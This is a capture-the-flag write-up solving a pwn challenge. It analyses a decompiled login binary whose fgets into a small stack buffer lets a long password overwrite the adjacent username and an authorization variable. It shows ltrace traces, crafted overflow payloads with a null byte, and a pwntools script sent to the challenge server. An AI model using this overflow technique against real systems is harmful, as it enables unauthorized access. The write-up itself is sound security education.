# Authorized access only!

Only authorized access is allowed to my service!

`nc authorized-access-only.chall.uiactf.no 1337`
    
[⬇️ chal](./chal)

# Writeup

Opening this in [Dogbolt](https://dogbolt.org/?id=6192b6a1-16f0-417c-a4c1-9751b57c52f5) I see the main function uses gets on the password and allows 200 bytes. This is a classic buffer overflow, so by sending 200 bytes I can overwrite the stack most likely.

```c
undefined8 main(void) {
  int iVar1;
  undefined8 local_48;
  undefined8 local_40;
  undefined4 local_38;
  undefined8 local_28;
  undefined8 local_20;
  undefined4 local_18;
  char local_12;
  char local_11;
  FILE *local_10;
  
  local_12 = '\0';
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  initialize();
  puts(
      "This system is for authorized use only. Unauthorized access will result in immediate disconnection!"
      );
  printf("Username: ");
  fgets((char *)&local_28,0x14,stdin);
  printf("\nPassword: ");
  fgets((char *)&local_48,200,stdin);
  putchar(10);
  iVar1 = strncmp((char *)&local_28,"admin",5);
  if (iVar1 == 0) {
    iVar1 = strncmp((char *)&local_48,"l37 m3 3n73r plz!",0x11);
    if (iVar1 == 0) {
      iVar1 = strcmp(&local_12,"true");
      if (iVar1 == 0) {
        local_10 = fopen("./flag.txt","r");
        if (local_10 == (FILE *)0x0) {
          puts("Could not locate flag file! Contact admins to find it!");
                    // WARNING: Subroutine does not return
          exit(1);
        }
        while( true ) {
          iVar1 = fgetc(local_10);
          local_11 = (char)iVar1;
          if (local_11 == -1) break;
          putchar((int)local_11);
        }
        putchar(10);
                    // WARNING: Subroutine does not return
        exit(0);
      }
    }
  }
  printf("DISCONNECTED!");
  return 0;
}
```

A closer look shows me that I need to overwrite `local_12` to be `true` for this to work. Using `ltrace` I can simply see what happens with the data I insert:

`l37 m3 3n73r plz! abcdefgijklmonpqrstuvexyz`

```bash
└─$ ltrace ./chal 
setvbuf(0x7fbf6f495780, nil, 2, 0)                                                                                              = 0
setvbuf(0x7fbf6f494aa0, nil, 2, 0)                                                                                              = 0
setvbuf(0x7fbf6f4956a0, nil, 2, 0)                                                                                              = 0
signal(SIGALRM, 0x55eb895332a9)                                                                                                 = nil
alarm(60)                                                                                                                       = 0
puts("This system is for authorized us"...This system is for authorized use only. Unauthorized access will result in immediate disconnection!
)                                                                                     = 100
printf("Username: "Username: )                                                                                                            = 10
fgets(admin
"admin\n", 20, 0x7fbf6f494aa0)                                                                                            = 0x7ffeb9bcfe40
printf("\nPassword: "
Password: )                                                                                                          = 11
fgets(l37 m3 3n73r plz! abcdefgijklmonpqrstuvexyz
"l37 m3 3n73r plz! abcdefgijklmon"..., 200, 0x7fbf6f494aa0)                                                               = 0x7ffeb9bcfe20
putchar(10, 0x7fbf6f494b23, 44, 0x7ffeb9bcfe20
)                                                                                 = 10
strncmp("pqrstuvexyz\n", "admin", 5)                                                                                            = 15
printf("DISCONNECTED!"DISCONNECTED!)                                                                                                         = 13
+++ exited (status 0) +++
```

As we see `strncmp("pqrstuvexyz\n", "admin", 5)` so from the letter `p` I need `admin`.

New input:

`l37 m3 3n73r plz! XXXXXXXXXXXXXXadminpqrstuvexyz`

resulted in:
```bash
strncmp("adminpqrstuvexyz\n", "admin", 5)                                                                                       = 0
strncmp("l37 m3 3n73r plz! XXXXXXXXXXXXXX"..., "l37 m3 3n73r plz!", 17)                                                         = 0
strcmp("", "true")
```

Closing in here. We just need to add more?`

`l37 m3 3n73r plz! XXXXXXXXXXXXXXadminpqrstuvexyz12345658abcdef`

gave me:

```bash
strncmp("adminpqrstuvexyz12345658abcdef\n", "admin", 5)                                                                         = 0
strncmp("l37 m3 3n73r plz! XXXXXXXXXXXXXX"..., "l37 m3 3n73r plz!", 17)                                                         = 0
strcmp("58abcdef\n", "true")                                                                                                    = -63
```

New input: 

`l37 m3 3n73r plz! XXXXXXXXXXXXXXadminXXXXXXXXXXXXXXXXXtrue`

```bash
strncmp("adminXXXXXXXXXXXXXXXXXtrue\n", "admin", 5)                                                                             = 0
strncmp("l37 m3 3n73r plz! XXXXXXXXXXXXXX"..., "l37 m3 3n73r plz!", 17)                                                         = 0
strcmp("true\n", "true")                                                                                                        = 10
```

Close, but that newline must be gone. I struggeled a bit here but Decoy found out that we could just insert a nullbyte.

```bash
$ echo -ne "\nl37 m3 3n73r plz! XXXXXXXXXXXXXXadminXXXXXXXXXXXXXXXXXtrue\x00" | ./chal
This system is for authorized use only. Unauthorized access will result in immediate disconnection!
Username: 
Password: 
LOCAL_TEST_FLAG
```

Lets try agains the remote, unfortunally I could not get the `echo xx | nc..` work so I used a [python script](./solve.py):

```python
from pwn import *
context.log_level = "error"
    
r = remote("authorized-access-only.chall.uiactf.no", 1337)
r.recvuntil(b"Username: ")
r.sendline(b"admin")
r.recvuntil(b"Password: ")
r.sendline(b"l37 m3 3n73r plz!XXXXXXXXXXXXXXXadminXXXXXXXXXXXXXXXXXtrue\x00")
print(r.recvall().strip().decode())
```